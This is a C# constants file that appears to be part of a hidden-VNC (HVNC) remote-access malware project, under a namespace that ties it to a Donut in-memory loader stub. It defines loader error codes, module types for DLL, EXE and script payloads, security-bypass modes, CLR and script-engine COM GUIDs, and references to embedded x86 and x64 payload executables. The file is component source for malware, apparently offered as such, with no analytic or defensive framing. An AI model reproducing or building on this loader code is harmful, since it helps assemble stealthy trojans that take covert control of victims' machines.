using System;
using BirdBrainmofo.HVNC.StubUtils.Donut.Payloads;

namespace BirdBrainmofo
{
    internal class Constants
    {
        public const int CIPHER_BLK_LEN = 16;

        public const int DONUT_KEY_LEN = 16;

        public const int DONUT_BLK_LEN = 16;

        public const int DONUT_ERROR_SUCCESS = 0;

        public const int DONUT_ERROR_FILE_NOT_FOUND = 1;

        public const int DONUT_ERROR_FILE_EMPTY = 2;

        public const int DONUT_ERROR_FILE_ACCESS = 3;

        public const int DONUT_ERROR_FILE_INVALID = 4;

        public const int DONUT_ERROR_NET_PARAMS = 5;

        public const int DONUT_ERROR_NO_MEMORY = 6;

        public const int DONUT_ERROR_INVALID_ARCH = 7;

        public const int DONUT_ERROR_INVALID_URL = 8;

        public const int DONUT_ERROR_URL_LENGTH = 9;

        public const int DONUT_ERROR_INVALID_PARAMETER = 10;

        public const int DONUT_ERROR_RANDOM = 11;

        public const int DONUT_ERROR_DLL_FUNCTION = 12;

        public const int DONUT_ERROR_ARCH_MISMATCH = 13;

        public const int DONUT_ERROR_DLL_PARAM = 14;

        public const int DONUT_ERROR_BYPASS_INVALID = 15;

        public const int DONUT_ERROR_NORELOC = 16;

        public const int DONUT_ARCH_ANY = -1;

        public const int DONUT_ARCH_X86 = 1;

        public const int DONUT_ARCH_X64 = 2;

        public const int DONUT_ARCH_X84 = 3;

        public const int DONUT_MODULE_NET_DLL = 1;

        public const int DONUT_MODULE_NET_EXE = 2;

        public const int DONUT_MODULE_DLL = 3;

        public const int DONUT_MODULE_EXE = 4;

        public const int DONUT_MODULE_VBS = 5;

        public const int DONUT_MODULE_JS = 6;

        public const int DONUT_MODULE_XSL = 7;

        public const int DONUT_INSTANCE_PIC = 1;

        public const int DONUT_INSTANCE_URL = 2;

        public const int DONUT_BYPASS_SKIP = 1;

        public const int DONUT_BYPASS_ABORT = 2;

        public const int DONUT_BYPASS_CONTINUE = 3;

        public const int DONUT_MAX_PARAM = 8;

        public const int DONUT_MAX_NAME = 256;

        public const int DONUT_MAX_DLL = 8;

        public const int DONUT_MAX_URL = 256;

        public const int DONUT_MAX_MODNAME = 8;

        public const int DONUT_SIG_LEN = 8;

        public const int DONUT_VER_LEN = 32;

        public const int DONUT_DOMAIN_LEN = 8;

        public const string DONUT_RUNTIME_NET2 = "v2.0.50727";

        public const string DONUT_RUNTIME_NET4 = "v4.0.30319";

        public const string NTDLL_DLL = "ntdll.dll";

        public const string KERNEL32_DLL = "kernel32.dll";

        public const string ADVAPI32_DLL = "advapi32.dll";

        public const string CRYPT32_DLL = "crypt32.dll";

        public const string MSCOREE_DLL = "mscoree.dll";

        public const string OLE32_DLL = "ole32.dll";

        public const string OLEAUT32_DLL = "oleaut32.dll";

        public const string WININET_DLL = "wininet.dll";

        public const string COMBASE_DLL = "combase.dll";

        public const string USER32_DLL = "user32.dll";

        public const string SHLWAPI_DLL = "shlwapi.dll";

        public static Guid xCLSID_CorRuntimeHost;

        public static Guid xIID_ICorRuntimeHost;

        public static Guid xCLSID_CLRMetaHost;

        public static Guid xIID_ICLRMetaHost;

        public static Guid xIID_ICLRRuntimeInfo;

        public static Guid xIID_AppDomain;

        public static Guid xIID_IUnknown;

        public static Guid xIID_IDispatch;

        public static Guid xIID_IHost;

        public static Guid xIID_IActiveScript;

        public static Guid xIID_IActiveScriptSite;

        public static Guid xIID_IActiveScriptSiteWindow;

        public static Guid xIID_IActiveScriptParse32;

        public static Guid xIID_IActiveScriptParse64;

        public static Guid xCLSID_VBScript;

        public static Guid xCLSID_JScript;

        public static Guid xCLSID_DOMDocument30;

        public static Guid xIID_IXMLDOMDocument;

        public static Guid xIID_IXMLDOMNode;

        public static int MARU_MAX_STR;

        public static int MARU_BLK_LEN;

        public static int MARU_HASH_LEN;

        public static int MARU_IV_LEN;

        public static byte[] PAYLOAD_EXE_x86;

        public static byte[] PAYLOAD_EXE_x64;

        static Constants()
        {
            xCLSID_CorRuntimeHost = new Guid(3408881443u, 43834, 4562, 156, 64, 0, 192, 79, 163, 10, 62);
            xIID_ICorRuntimeHost = new Guid(3408881442u, 43834, 4562, 156, 64, 0, 192, 79, 163, 10, 62);
            xCLSID_CLRMetaHost = new Guid(2457868429u, 3726, 18535, 179, 12, 127, 168, 56, 132, 232, 222);
            xIID_ICLRMetaHost = new Guid(3543325598u, 47539, 16677, 130, 7, 161, 72, 132, 245, 50, 22);
            xIID_ICLRRuntimeInfo = new Guid(3174683090u, 47663, 18538, 137, 176, 180, 176, 203, 70, 104, 145);
            xIID_AppDomain = new Guid(100046556, 11049, 13923, 173, 139, 196, 56, 156, 242, 167, 19);
            xIID_IUnknown = new Guid(0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70);
            xIID_IDispatch = new Guid(132096, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70);
            xIID_IHost = new Guid(2444213531u, 24555, 17397, 176, 40, 226, 202, 150, 6, 23, 236);
            xIID_IActiveScript = new Guid(3139054305u, 42233, 4559, 143, 32, 0, 128, 95, 44, 208, 100);
            xIID_IActiveScriptSite = new Guid(3674317283u, 42027, 4559, 143, 32, 0, 128, 95, 44, 208, 100);
            xIID_IActiveScriptSiteWindow = new Guid(3507447649u, 33769, 4559, 143, 32, 0, 128, 95, 44, 208, 100);
            xIID_IActiveScriptParse32 = new Guid(3139054306u, 42233, 4559, 143, 32, 0, 128, 95, 44, 208, 100);
            xIID_IActiveScriptParse64 = new Guid(3354359384u, 57838, 18446, 151, 234, 213, 44, 180, 215, 109, 23);
            xCLSID_VBScript = new Guid(3041867585u, 23303, 4559, 164, 176, 0, 170, 0, 74, 85, 232);
            xCLSID_JScript = new Guid(4095001184u, 27328, 4559, 182, 209, 0, 170, 0, 187, 187, 88);
            xCLSID_DOMDocument30 = new Guid(4110913330u, 50513, 4563, 137, 185, 0, 0, 248, 31, 226, 33);
            xIID_IXMLDOMDocument = new Guid(691257217, 31542, 4562, 178, 14, 0, 192, 79, 152, 62, 96);
            xIID_IXMLDOMNode = new Guid(691257216, 31542, 4562, 178, 14, 0, 192, 79, 152, 62, 96);
            MARU_MAX_STR = 64;
            MARU_BLK_LEN = 16;
            MARU_HASH_LEN = 8;
            MARU_IV_LEN = MARU_HASH_LEN;
            PAYLOAD_EXE_x86 = payload_exe_x86.PAYLOAD_EXE_X86;
            PAYLOAD_EXE_x64 = payload_exe_x64.PAYLOAD_EXE_X64;
        }
    }
}
